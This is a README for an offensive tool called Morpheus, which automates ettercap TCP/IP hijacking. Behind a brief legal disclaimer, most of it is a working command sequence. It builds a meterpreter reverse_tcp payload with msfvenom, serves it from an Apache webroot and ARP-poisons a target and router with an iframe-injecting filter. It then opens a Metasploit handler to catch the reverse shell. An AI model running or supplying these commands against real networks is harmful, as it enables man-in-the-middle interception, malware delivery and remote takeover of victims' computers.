[![Version](https://img.shields.io/badge/MORPHEUS-1.0-brightgreen.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-developing-red.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-linux-orange.svg)]()
[![Github All Releases](https://img.shields.io/github/downloads/atom/atom/total.svg)]()
[![AUR](https://img.shields.io/aur/license/yaourt.svg)]()

# Morpheus - automated ettercap TCP/IP Hijacking tool
    Version release : v1.0-Alpha
    Author : pedro ubuntu  [ r00t-3xp10it ]
    Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
    Suspicious-Shell-Activity (SSA) RedTeam develop @2016

# LEGAL DISCLAMER
    The author does not hold any responsibility for the bad use
    of this tool, remember that attacking targets without prior
    consent is illegal and punished by law.

# Framework description
    morpheus.sh framework automates tcp/ip packet manipulation tasks by using
    ettercap filters to manipulate tcp/udp requests under MitM attacks replacing
    the http packet contents by our own contents befor sending the http packet
    back to the host that have request for it (tcp/ip hijacking)

    Diagram:
     1º - target requests webpage
     2º - attacker modifies webpage response
     3º - modified packet forward back to target


# Build msfvenom binary
    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f exe -o payload.exe



# Compile [filter].eft filter into iframe.ef
    sudo etterfilter /root/iframe.eft -o /root/iframe.ef

# copy files to apache2 webroot
    sudo cp /root/payload.exe /var/www/html

# Sart apache2 service
    /etc/init.d/apache2 start

# ip_forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward

# run ettercap mitm+filter
    sudo ettercap -T -q -i wlan0 -F /root/iframe.ef -M ARP /targetip/ /routerip/


# IF YOUR PC USES IPV6 THEN USE THIS CONFIG INSTEAD OF THE ABOVE CODE
    sudo ettercap -T -q -i wlan0 -F /root/iframe.ef -M ARP /targetip// /routerip//


# Start a multi-handler
    sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.67; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j -k'


_EOF
